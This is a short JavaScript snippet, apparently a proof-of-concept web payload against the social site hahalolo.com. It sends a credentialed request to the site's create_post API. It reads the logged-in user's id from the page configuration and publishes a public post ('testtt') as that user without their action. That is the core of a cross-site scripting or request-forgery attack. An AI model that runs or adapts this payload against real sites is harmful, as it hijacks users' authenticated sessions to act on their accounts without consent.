var r=new XMLHttpRequest();
r.open('post','https://www.hahalolo.com/api/experience/create_post',true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.setRequestHeader('X-Requested-With','XMLHttpRequest');
r.withCredentials=true;
r.send('requestBody=%7B%22id%22%3Anull%2C%22user%22%3A%22'+window.HALO_CONFIG.loginUser.pn100+'%22%2C%22scope%22%3A%22pub%22%2C%22text%22%3A%22testtt%22%2C%22when%22%3A%222020-05-02T18%3A40%3A54.937Z%22%2C%22title%22%3A%22%22%7D');